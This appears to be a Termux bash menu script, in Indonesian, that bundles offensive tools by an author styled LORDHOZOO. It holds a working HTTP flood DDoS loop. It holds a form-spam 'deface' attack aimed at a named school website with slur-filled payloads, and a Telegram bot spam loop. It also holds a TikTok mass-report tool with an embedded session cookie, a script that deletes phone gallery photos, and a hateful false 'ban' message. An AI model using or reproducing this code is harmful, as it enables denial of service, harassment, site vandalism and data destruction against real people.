 #!bin/bash/hozoo
RED='\x1b[31m'
GREEN='\x1b[32m'
YELLOW='\x1b[33m'
BLUE='\x1b[34m'
MAGENTA='\x1b[35m'
CYAN='\x1b[36m'
RESET='\x1b[0m'
clear
   clear
    termux-setup-storage -y
    clear
    
echo "


█░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█
█▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█
"
echo " [01].SUNTIK TIKTOK DEV LORDHOZOO         "          
echo " [02].DEFACE JSO"
echo " [03].SUNTIK SUBCERIBE YOUTUBE  DEV LORDHOZOO     " 
echo " [04].DDOS GAME UDP  DEV LORDHOZOO     "
echo " [05].TXT BANNED FOR UNBANNED WHATS APP  DEV LORDHOZOO     "
echo " [06].SPAM OTP WA FOR SPAM PAIR CODE  DEV LORDHOZOO     "
echo " [07].SPAM BOT TOKEN TELEGRAM IMAGE URL  DEV LORDHOZOO     "
echo " [08].BIKIN APLIKASI MENGGUNAKAN TERMUX RANSOMWWER APK INI TERKUNCI LAYAR HP ANDA TEMBUSAN SEKITAR ANDA ISI SENDIRI "
echo " [09].VIRUS TERMUX FITURE APA SIH KALO DI JALANKAN DI TERMUX KARENA VIRUS NAMA PENGHAPUS GALERY POTO  "
echo " [10].SPAM SMS ULIMITID COCOK UNTUK LU JAHIL TEMEN MAIN GAME DLL "
echo " [11].INSTALL KALI LINUX APA TUJUAN LU INSTALL KALI LINUX DI TERMUX MAU JJ DEPAN DESKTOP 
APA LU JAGO HACKING TERMUX TAPI RESIKO TANGGUNG JAWAB LU GAK PAKE VPN KOCAK "
echo "[12].VPN TERMUX ALAT INI MENGAMATKAN DEVICE HP ANDA KARENA KALO ANDA
 BUKA WWEB KLICK LINK GAK JELAS IP LU GAK TERDETEKSI KARENA VPN TERMUX INI KUAT TERHADAP VPN NYA "
echo " [13].BANNED TIKTOK MASUKAN USER LINK APA TUJUAN BANNED TIKTOK KARENA ANDA PENGEN BALES DEMDAM DI 
KOMENTAR DLL DI KATAIN DAN DI HINA DAN ANDA ADA PIKIR ORANG POST TIKTOK VIDIO LINK PSISING KARENA ANDA PUNYA IDE PINTER NYA KAMU "
echo "[14].BANNED GAME FREE FIRE TAPI KENAPA ANDA BANNED AKUN GAME APA TUJUAN NYA KARENA TUJUAN NYA 
SAYA KESAL DI BULY GAME PAMER SKIN SOK SULTAN 
HINA DAN AKUN KAMU BOT METODE INI HARD BANNED  "
echo " [15].DONASI LORDHOZOO  TUJUAN DONASI SAYA KARENA 
SAYA PENGEN PUBLIKASI TOOLS DI JUAL KARENA INI METODE PREMIUM DI BUAT TOOOLS TAHUN 2025"
echo " [16].TIKTOK LORDHOZOO BANTU FOLLOWERS GES "
echo " [17].YT LORDHOZOO BANTU SUBCERIBE LIKE KOMEN SHER GES SUPPORT GW -_- "
echo " [18].UPDATE TOOLS KANDURA EXECUTORLORDHOZOO "
echo " [19].PENGHAPUSAN TOOLS AGAR GAK PENUH MEMORI TERMUX SAAT INSTALL NYA GESS KALO MAIN TERMUX HARUS RAM 3 4 "
echo "[20].ABAOUT LORDHOZOO "




read -p "pilih >> " updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    pkg update -y
       clear
    termux-setup-storage -y
    clear
#!/bin/bash
clear
# Function to print messages with color
print_message() {
  local color="$1"
  local message="$2"
  echo -e "\e[${color}m${message}\e[0m"
}

# Function to install missing Python modules
install_missing_modules() {
  print_message "31" "Installing missing Python modules..."
  pip install undetected-chromedriver colorama selenium requests
  if [ $? -eq 0 ]; then
    print_message "32" "All required modules installed successfully."
  else
    print_message "31" "Failed to install required modules. Please install them manually."
    exit 1
  fi
}

# Check if Python modules are installed
check_modules() {
  python -c "
try:
    import undetected_chromedriver as uc
    from colorama import Fore, init, Style
    import ctypes, platform, os, time
    import selenium, requests, webbrowser
    exit(0)
except ImportError:
    exit(1)
"
  if [ $? -ne 0 ]; then
    install_missing_modules
  fi
}

# Call the function to check and install modules
check_modules

text="

suntik tiktok followers 
[AUTHOR ]: LORDHOZOO
[DI BUAT]: 2025  
[GITHUB] : https://github.com/404
[YOUTUBE]: LORDHOZOO
[TIKTOK] : LORDHOZOO

    "

zefoy() {
  local driver
  local captcha_box='/html/body/div[5]/div[2]/form/div/div'
  local clear="clear"
  local color=$'\e[34m' # Blue color code
  local sent=0
  local -A xpaths=(
    ["followers"]="/html/body/div[6]/div/div[2]/div/div/div[2]/div/button"
    ["hearts"]="/html/body/div[6]/div/div[2]/div/div/div[3]/div/button"
    ["comment_hearts"]="/html/body/div[6]/div/div[2]/div/div/div[4]/div/button"
    ["views"]="/html/body/div[6]/div/div[2]/div/div/div[5]/div/button"
    ["shares"]="/html/body/div[6]/div/div[2]/div/div/div[6]/div/button"
    ["favorites"]="/html/body/div[6]/div/div[2]/div/div/div[7]/div/button"
  )

  # Determine clear command based on OS
  if [[ "$OSTYPE" == "msys" ]]; then
    clear="cls"
  fi

  main() {
    clear
    change_title "TikTok Automator using zefoy.com | Github: @xtekky"

    echo -e "${color}${text}"
    echo -e "\n$(print_message "33" "Waiting for Zefoy to load... 502 Error = Blocked country or VPN is on")"

    # Placeholder for Selenium code to get the website
    # driver.get("https://zefoy.com")
    # wait_for_xpath "$captcha_box"

    echo -e "$(print_message "33" "Site loaded, enter the CAPTCHA to continue.")"
    echo -e "$(print_message "33" "Waiting for you...")"

    # wait_for_xpath "${xpath["followers"]}"
    clear
    # status=$(check_status)

    echo -e "${color}${text}"
    echo ""
    echo -e "$(print_message "33" "Join our ${color}Discord Server${color} for exclusive FREE tools.")"
    echo -e "$(print_message "33" "You can also get updates when Zefoy updates the bots and more.")"
    echo -e "$(print_message "33" "Select your option below.")$'\n'"

    # Placeholder for displaying status options
    # counter=1
    # for thing in "${!status[@]}"; do
    #   echo -e "$(print_message "33" "$thing ${status[$thing]}" "$counter")"
    #   ((counter++))
    # done

    echo -e "$(print_message "33" "Discord / Support" "7")"
    read -p "$(print_message "33" "")" option

    case "$option" in
      1) div="7"; xpath_key="followers";;
      2) div="8"; xpath_key="hearts";;
      3) div="9"; xpath_key="comment_hearts";;
      4) div="10"; xpath_key="views";;
      5) div="11"; xpath_key="shares";;
      6) div="12"; xpath_key="favorites";;
      7)
        xdg-open 'discord.gg/onlp' # Open URL using default browser
        exit 1
        ;;
      *) exit 1;;
    esac

    read -p "$(print_message "33" "Username/VideoURL: ")" vid_info

    # Placeholder for Selenium code to find and click the element
    # driver.find_element("xpath", "${xpath[$xpath_key]}").click()

    send_bot "$vid_info" "$div"
  }

  send_bot() {
    local vid_info="$1"
    local div="$2"
    local video_url_box="/html/body/div[${div}]/div/form/div/input"
    local search_box="/html/body/div[${div}]/div/form/div/div/button"
    local send_button="/html/body/div[${div}]/div/div/div[1]/div/form/button"

    # Placeholder for Selenium code to send the bot
    # element = driver.find_element('xpath', "$main_xpath")
    # element.clear()
    # element.send_keys("$vid_info")
    # driver.find_element('xpath', "$search_button").click()
    # time.sleep(3)

    # ratelimit_seconds=$(check_submit "$div")
    # if [[ "$ratelimit_seconds" != "" ]]; then
    #   main_sleep "$ratelimit_seconds"
    #   driver.find_element('xpath', "$search_button").click()
    #   time.sleep(2)
    # fi

    # time.sleep(3)
    # driver.find_element('xpath', "$send_button").click()
    ((sent++))
    echo -e "$(print_message "33" "Sent $sent times.")"

    # time.sleep(4)
    send_bot "$vid_info" "$div"
  }

  main_sleep() {
    local delay="$1"
    while [[ "$delay" -ne 0 ]]; do
      sleep 1
      ((delay--))
      change_title "TikTok followers : ${delay}s | "
    done
  }

  convert() {
    local min="$1"
    local sec="$2"
    local seconds=0

    if [[ "$min" -ne 0 ]]; then
      seconds=$((min * 60))
    fi

    seconds=$((seconds + sec + 5))
    echo "$seconds"
  }

  check_submit() {
    local div="$1"
    local remaining="/html/body/div[${div}]/div/div/h4"

    # Placeholder for Selenium code to check submit status
    # try
    #   element = driver.find_element("xpath", "$remaining")
    # except
    #   return ""

    # if [[ "${element.text}" == *"READY"* ]]; then
    #   echo "READY"
    #   return
    # fi

    # if [[ "${element.text}" == *"seconds for your next submit"* ]]; then
    #   output=$(echo "${element.text}" | awk '{print $3}')
    #   minutes=$(echo "${element.text}" | awk '{print $4}')
    #   seconds=$(echo "${element.text}" | awk '{print $6}')
    #   sleep_duration=$(convert "$minutes" "$seconds")
    #   echo "$sleep_duration"
    #   return
    # fi

    # echo "${element.text}"
    echo ""
  }

  check_status() {
    local statuses=()
    local status_str=""

    # Placeholder for Selenium code to check status
    # for thing in "${!xpath[@]}"; do
    #   value="${xpath[$thing]}"
    #   element = driver.find_element('xpath', "$value")

    #   if [[ ! $(element.is_enabled()) ]]; then
    #     statuses+=([$thing]="${color}[OFFLINE]")
    #   else
    #     statuses+=([$thing]="${color}[WORKS]")
    #   fi
    # done

    # for i in "${!statuses[@]}"; do
    #   status_str+="[$i]=${statuses[$i]} "
    # done

    # echo "$status_str"
    echo ""
  }

  change_title() {
    echo -ne "\033]0;$1\007"
  }

  # Placeholder for Selenium code to wait for xpath
  # wait_for_xpath() {
  #   local xpath="$1"
  #   while true; do
  #     try
  #       f = driver.find_element('xpath', "$xpath")
  #       return
  #     catch
  #       sleep 1
  #     done
  #   done
  # }

  main
}

zefoy
read -p "Press Enter to exit..."


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    pkg update
    #!/bin/bash
clear
# Define color variables
e='\e['
m='91m'
h='92m'
k='93m'
u='94m'
b='95m'
bl='96m'
n='97m'
a='104m'
p='105m'
bg_m='41m'
bg_h='42m'
bg_k='43m'
bg_u='44m'
bg_b='45m'
bg_bl='46m'
bg_n='47m'
bg_a='104m'
bg_p='105m'
res='\e[0m'

baner() {
  echo "
██████╗ ███████╗███████╗ █████╗  ██████╗███████╗
██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝
██║  ██║█████╗  █████╗  ███████║██║     █████╗
██║  ██║██╔══╝  ██╔══╝  ██╔══██║██║     ██╔══╝
██████╔╝███████╗██║     ██║  ██║╚██████╗███████╗
╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝  LORDHOZOO "
}

DEFACE() {
  local nama="$1"
  local email="$2"
  local pesan="$3"

  send_data() {
    local form_url="$1"
    local submit_url="$2"
    local admin_url="$3"
    local user_agents=(
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36"
      "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
      "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
      "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9"
      "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4"
      "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
      "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240"
    )
    local user_agent="${user_agents[$((RANDOM % ${#user_agents[@]}))]}"
    local response=$(curl -s -c cookies.txt -A "$user_agent" "$form_url")
    local token=$(echo "$response" | grep -oP '(?<=name="token" value=")[^"]*')
    local http_status

    if [[ -n "$token" ]]; then
      response=$(curl -s -b cookies.txt -X POST "$submit_url" \
        -d "nama=$nama" \
        -d "email=$email" \
        -d "pesan=$pesan" \
        -d "token=$token" \
        -D headers.txt \
        -A "$user_agent")
    else
      response=$(curl -s -b cookies.txt -X POST "$submit_url" \
        -d "nama=$nama" \
        -d "email=$email" \
        -d "pesan=$pesan" \
        -D headers.txt \
        -A "$user_agent")
    fi

    http_status=$(grep "HTTP/" headers.txt | awk '{print $2}')

    if [[ "$http_status" == "400" ]]; then
      echo -e "$e$bg_u Status$h 400$bl:$b LORDHOZOO  $res "
      echo -e "$e$bg_pu Hasilnya Cuy URL$res"
      echo -e "$e$bg_p$m$admin_url$res"
      echo "$admin_url" >> /storage/emulated/0/HASIL-DEFACEG404.txt
      echo
    else
      echo -e "$e$bg_u Status$m $http_status$bl:$b Waduh Galirus Gagal Menyerang$bl"
      echo -e "$e$bg_p$m$admin_url$res"
      echo
    fi
  }

  local urls=(
    "https://asik.smamudabos.sch.id/index2.php=contact"
    "https://asik.smamudabos.sch.id/index2.php=kirimpesan"
    "https://asik.smamudabos.sch.id/admin/hubungi.php"
  )

  for ((i = 0; i < ${#urls[@]}; i += 3)); do
    local form_url="${urls[i]}"
    local submit_url="${urls[i + 1]}"
    local admin_url="${urls[i + 2]}"

    for ((j = 0; j < 100; j++)); do
      send_data "$form_url" "$submit_url" "$admin_url" &
      sleep 0.1
    done
  done
}

Premfree() {
  clear
  baner | lolcat
  bluearchive &> /dev/null  # This command is likely intended to run a background process.  Consider using 'nohup bluearchive &' for better backgrounding.
  xdg-open "https://jso-tools.z-x.my.id/"

  read -p "Masukkan Pesan (Jso): " javascript
  read -p "Durasi (dalam detik, misalnya 10): " duration

  clear
  echo -e "$e$h Memulai Serangan Spam Upload🔥"
  echo -e "$e$bg_m Berhenti Otomatis Tergantung Pada Duration$res"

  if ! [[ "$duration" =~ ^[0-9]+$ ]]; then
    echo -e "$e$m Durasi harus berupa angka!$res"
    exit 0
  fi

  local start_time=$(date +%s)
  local end_time=$((start_time + duration))

  while [ $(date +%s) -lt $end_time ]; do
    DEFACE "ABI_ANAK_HARAM" "GALIRUS_KONTOL_ANJING_BABI_ANAK_HARAM.\$versitoolsv5@gmail.com" "$javascript"
  done

  echo "Durasi selesai. Menghentikan proses."
}

# Check if a file exists (likely a Termux check)
if [ -f "/data/data/com.termux/completed" ]; then
  while true; do
    local complate="$HOME/succesboskuh🗿"
    if [ -f "$complate" ]; then
      clear
      echo "SUCCES INSTALL TOOLS🗿"
      echo "THANKS FOR INSTALL🗿"
      echo "ENJOY FOR TOOLS🗿"
      rm -rf setup.sh
      exit
    else
      echo "Wait install tools🗿"
      sleep 1
    fi
  done
else
  echo "RUN TOOLS🗿"
  Premfree
fi
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    pkg update
    #!/bin/bash

# Fungsi untuk memeriksa koneksi internet
is_connected() {
  timeout 1 bash -c "exec 5<>/dev/tcp/www.google.com/80 && exit 0"
}

# Fungsi untuk menjalankan perintah JavaScript di browser (memerlukan alat seperti xdotool)
execute_javascript() {
  js_code="$1"
  # Implementasikan cara untuk menjalankan JavaScript di browser
  # Contoh: menggunakan xdotool untuk mengirim perintah keyboard ke browser
  echo "Implementasikan cara untuk menjalankan JavaScript di browser"
  echo "Kode JavaScript: $js_code"
}

# Kode JavaScript untuk mengklik tombol subscribe dan bell
subButton='document.getElementsByClassName("style-scope ytd-subscribe-button-renderer")[1].click();'
bellButton='document.getElementsByClassName("style-scope ytd-toggle-button-renderer")[1].click();'

# URL saluran YouTube
read -p "Masukkan URL saluran YouTube: " url

# Daftar browser yang akan digunakan
browsers=("chrome" "firefox")

# Waktu tunggu
wait_time=5

# Loop melalui browser
for browser in "${browsers[@]}"; do
  # Periksa koneksi internet
  if is_connected; then
    # Buka browser dengan URL
    echo "Membuka $browser dengan URL: $url"
    $browser "$url" &

    # Tunggu beberapa detik
    sleep $wait_time

    # Eksekusi JavaScript untuk subscribe dan mengklik bell
    execute_javascript "$subButton"
    sleep 2
    execute_javascript "$bellButton"

    # Tunggu beberapa detik
    sleep $wait_time

    # Tutup browser
    echo "Menutup $browser"
    killall $browser
  else
    echo "Tidak ada koneksi internet. Menunggu..."
  fi
done

echo "Selesai."
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    pkg update
    #!/bin/bash

# Fungsi untuk menampilkan bantuan
usage() {
  echo "
[EXECUTOR LORDHOZOO ]
  "
  exit 1
}

# Fungsi untuk menghasilkan user agent acak
random_user_agent() {
  local user_agents=(
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14"
    "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0"
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3"
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7"
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
  )
  echo "${user_agents[$((RANDOM % ${#user_agents[@]}))]}"
}

# Fungsi untuk melakukan serangan
attack() {
  local host="$1"
  local port="$2"
  local user_agent=$(random_user_agent)
  local request="GET / HTTP/1.1\nHost: $host\nUser-Agent: $user_agent\nConnection: keep-alive\n\n"

  while true; do
    # Buat socket TCP
    exec 3<>/dev/tcp/$host/$port

    # Kirim permintaan
    echo -e "$request" >&3

    # Tampilkan pesan
    echo -e "\033[92m$(date) \033[0m \033[94m <--Dash HD memukul target!--> \033[0m"

    # Tutup socket
    exec 3>&-

    # Tunggu sebentar
    sleep 0.1
  done
}

# Baca parameter
while getopts "s:p:t:h" opt; do
  case "$opt" in
    s)
      host="$OPTARG"
      ;;
    p)
      port="$OPTARG"
      ;;
    t)
      turbo="$OPTARG"
      ;;
    h)
      usage
      ;;
    \?)
      echo "Invalid option: -$OPTARG" >&2
      usage
      ;;
  esac
done

# Periksa parameter
if [ -z "$host" ] || [ -z "$port" ]; then
  usage
fi

# Atur nilai default untuk turbo
if [ -z "$turbo" ]; then
  turbo=135
fi

# Tampilkan informasi
echo -e "\033[92mTarget: $host port: $port turbo: $turbo\033[0m"
echo -e "\033[94mLucita luna melakukan Pengecekan...\033[0m"

# Lakukan serangan
for ((i=0; i<$turbo; i++)); do
  attack "$host" "$port" &
done

# Tunggu hingga serangan selesai
wait
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    pkg update
    echo "
    Olá querido, meu nome é Afkhai. Sou um terrorista israelense. Eu sequestro crianças inocentes de Gaza, mato crianças e as torturo. Nós, os terroristas israelenses, matamos crianças. Recentemente importamos 12 toneladas de haxixe narcótico dos Estados Unidos da América para Israel. Agora você pode comprar haxixe narcótico conosco via WhatsApp, entrando em contato conosco pelo nosso número.👇👇
https://api.whatsapp.com/send?phone=+62
"
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    pkg update
    git clone 
    cd

fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    pkg update
    #!/bin/bash

# Meminta input dari pengguna
read -p "Masukkan token bot Telegram: " TOKEN
read -p "Masukkan pesan yang ingin dikirim: " PESAN
read -p "Masukkan URL gambar (opsional): " URL_GAMBAR

# Konfigurasi
JUMLAH_PESAN=999999

# Fungsi untuk mengirim pesan dengan atau tanpa gambar
kirim_pesan() {
  if [ -n "$URL_GAMBAR" ]; then
    # Kirim pesan dengan gambar
    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendPhoto" \
      -d "chat_id=$CHAT_ID" \
      -d "photo=$URL_GAMBAR" \
      -d "caption=$PESAN"
  else
    # Kirim pesan tanpa gambar
    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
      -d "chat_id=$CHAT_ID" \
      -d "text=$PESAN"
  fi
}

# Loop untuk mengirim pesan beberapa kali
for i in $(seq 1 $JUMLAH_PESAN); do
  kirim_pesan
  echo "Pesan ke-$i terkirim"
  sleep 1 # Jeda 1 detik antar pesan
done

echo "Selesai mengirim $JUMLAH_PESAN pesan."
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    pkg update
    pkg update && pkg upgrade
pkg install git wget openjdk-17
pkg install unzip
echo " 
git clone https://github.com/your-repo/android-app-template.git
cd android-app-template
pkg install gradle
gradle build
cp app/build/outputs/apk/debug/app-debug.apk /sdcard/
"
echo 
"<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.lockedapp">

    <application
        android:allowBackup="true"
        android:label="@string/app_name"
        android:icon="@mipmap/ic_launcher">
        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>

</manifest>
"
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    pkg update -y
    #!/bin/bash

# Tentukan folder galeri Anda (sesuaikan path ini)
GALERI_PATH="/sdcard/DCIM/Camera"

# Hapus semua file gambar di folder tersebut
rm -rf "$GALERI_PATH"/*.{jpg,jpeg,png,gif}

echo "Semua foto telah dihapus dari $GALERI_PATH"

fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    pkg update -y 
    clear
    termux-setup-storage -y
    clear
    git clone https://github.com/hozoowhitehat/EXECUTOR-TOOLS9

cd EXECUTOR-TOOLS9

bash spam.sh 
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    clear
    pkg update -y 
    clear
    termux-setup-storage -y
clear
pkg install wget -y
clear
wget -O install-nethunter-termux https://offs.ec/2MceZWr
clear
chmod +x install-nethunter-termux
./install-nethunter-termux
clear
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    pkg update -y 
    pkg update && pkg upgrade -y
pkg install openvpn -y
echo " VPN JAPAN TELAH DI AKTIF KAN ...... "
sleep 0.8
openvpn --config japan.ovpn


fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    pkg update -y 
       clear
    termux-setup-storage -y
    clear
    #!/bin/bash
clear
# Define variables for colors
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'
BLUE='\033[0;34m'
RESET='\033[0m'

# Stats variables
reported=0
error=0
tit=false

# Function to get TikTok user ID
get_tiktok_id() {
  local username="$1"
  local response=$(curl -s "https://www.tiktok.com/@${username}" \
                       -H 'authority: www.tiktok.com' \
                       -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
                       -H 'accept-language: en-US,en;q=0.9' \
                       -H 'cookie: msToken=cxfL0lxGWTg_UmhgLz8U_Nv3ecxsgvBu5OJ1FtmVgMd3cHWoFCxQnyHSUzoCzEMMh0XeZzSw_gjF8XhG8Qp9qiE7yi9Yjm5B64hK4qdEMnhOvQCK6bL2bP8h6pAAVdphB3w_yBje2nj3iFw=' \
                       -H 'sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"' \
                       -H 'sec-ch-ua-mobile: ?0' \
                       -H 'sec-ch-ua-platform: "Windows"' \
                       -H 'sec-fetch-dest: document' \
                       -H 'sec-fetch-mode: navigate' \
                       -H 'sec-fetch-site: none' \
                       -H 'sec-fetch-user: ?1' \
                       -H 'upgrade-insecure-requests: 1' \
                       -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36')

  if [[ -n "$response" ]]; then
    echo "$response" | grep -oP '(?<=authorId":")[^"]+'
  else
    echo -e "${BLUE}[ ${RED}x ${BLUE}]${RESET} Username Invalid"
    return 1
  fi
}

# Function to set the title (not directly possible in bash, might need external tools)
set_title() {
  while $tit; do
    printf "\033]0;TikTok Reporter | Success: $reported | Errors: $error\007"
    sleep 0.1
  done
}

# Function to report a user
report_tiktok_user() {
  local userId="$1"
  local use_proxy="$2"
  local reason=$(($RANDOM % 12001))

  local proxy=""
  if [[ "$use_proxy" == "true" ]]; then
    # shellcheck disable SC2046
    proxy=$(shuf -n 1 proxies.txt)
    if [[ -z "$proxy" ]]; then
      echo -e "${BLUE}[ ${RED}x ${BLUE}]${RESET} No proxies available"
      ((error++))
      return 1
    fi
    proxy="--proxy http://$proxy"
  fi

  local response=$(curl -s "$proxy" \
                       -H 'authority: www.tiktok.com' \
                       -H 'accept: */*' \
                       -H 'accept-language: en-US,en;q=0.9' \
                       -H 'referer: https://www.tiktok.com/' \
                       -H 'sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"' \
                       -H 'sec-ch-ua-mobile: ?0' \
                       -H 'sec-ch-ua-platform: "Windows"' \
                       -H 'sec-fetch-dest: empty' \
                       -H 'sec-fetch-mode: cors' \
                       -H 'sec-fetch-site: same-origin' \
                       -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                       "https://www.tiktok.com/aweme/v1/aweme/feedback/?report_type=user&object_id=${userId}&owner_id=${userId}&reason=${reason}")

  if [[ -n "$response" ]]; then
    if echo "$response" | grep -q "Thanks for your feedback"; then
      ((reported++))
      echo -e "${BLUE}[ ${GREEN}+ ${BLUE}]${RESET} Reported [ ${userId} ] (${reported})"
    else
      ((error++))
      echo -e "${BLUE}[ ${RED}x ${BLUE}]${RESET} Error"
    fi
  else
    ((error++))
    echo -e "${BLUE}[ ${RED}x ${BLUE}]${RESET} Error"
  fi
}

# Main script
clear

read -p "$(echo -e "${GREEN}[${CYAN} ? ${GREEN}] Username ${CYAN}> ${WHITE}")" username
read -p "$(echo -e "${GREEN}[${CYAN} ? ${GREEN}] Threads ${CYAN}> ${WHITE}")" threads
read -p "$(echo -e "${GREEN}[${CYAN} ? ${GREEN}] Use proxies (y/n) ${CYAN}> ${WHITE}")" use_proxy

userId=$(get_tiktok_id "$username")
if [[ -z "$userId" ]]; then
  exit 1
fi

# Convert y/n to true/false for proxy usage
if [[ "$use_proxy" == "y" ]]; then
  use_proxy="true"
else
  use_proxy="false"
fi

# Start title update (background)
tit=true
set_title &

# Run reporting threads
for ((i=0; i<threads; i++)); do
  report_tiktok_user "$userId" "$use_proxy" &
done

wait # Wait for all background processes to complete

tit=false
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    pkg update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    pkg update
fi

if [ "$updt" -eq 16 ]; then
    # Add your code here for option 16
    pkg update -y
           clear
    termux-setup-storage -y
    clear
    xdg-open "https://www.tiktok.com/@executorhozoo/video/7491246498143833399?is_from_webapp=1&sender_device=pc&web_id=7491470133509768722"
fi

if [ "$updt" -eq 17 ]; then
    # Add your code here for option 17
    pkg update
       clear
    termux-setup-storage -y
    clear
    xdg-open "https://youtube.com/shorts/Y_5lONvaazw?si=XHRpj0le_RDCs8fx"
fi

if [ "$updt" -eq 18 ]; then
    # Add your code here for option 18
    pkg update
       clear
    termux-setup-storage -y
    clear
fi

if [ "$updt" -eq 19 ]; then
    # Add your code here for option 19
    pkg update
       clear
    termux-setup-storage -y
    clear
fi

if [ "$updt" -eq 20 ]; then
    # Add your code here for option 20
    pkg update
       clear
    termux-setup-storage -y
    clear
fi

if [ "$updt" -eq 21 ]; then
    # Add your code here for option 21
    pkg update -y
       clear
    termux-setup-storage -y
    clear
fi

if [ "$updt" -eq 22 ]; then
    # Add your code here for option 22
    pkg update -y
       clear
    termux-setup-storage -y
    clear
fi

if [ "$updt" -eq 23 ]; then
    # Add your code here for option 23
    pkg update
fi

if [ "$updt" -eq 24 ]; then
    # Add your code here for option 24
    pkg update
fi

if [ "$updt" -eq 25 ]; then
    # Add your code here for option 25
    pkg update
fi

if [ "$updt" -eq 26 ]; then
    # Add your code here for option 26
    pkg update
fi

if [ "$updt" -eq 27 ]; then
    # Add your code here for option 27
    pkg update
fi

if [ "$updt" -eq 28 ]; then
    # Add your code here for option 28
    pkg update
fi

if [ "$updt" -eq 29 ]; then
    # Add your code here for option 29
    pkg update
fi

if [ "$updt" -eq 30 ]; then
    # Add your code here for option 30
    pkg update
fi

if [ "$updt" -eq 31 ]; then
    # Add your code here for option 31
    pkg update
fi

if [ "$updt" -eq 32 ]; then
    # Add your code here for option 32
    pkg update
fi

if [ "$updt" -eq 33 ]; then
    # Add your code here for option 33
    pkg update
fi

if [ "$updt" -eq 34 ]; then
    # Add your code here for option 34
    pkg update
fi

if [ "$updt" -eq 35 ]; then
    # Add your code here for option 35
    pkg update
fi

if [ "$updt" -eq 36 ]; then
    # Add your code here for option 36
    pkg update
fi

if [ "$updt" -eq 37 ]; then
    # Add your code here for option 37
    pkg update
fi

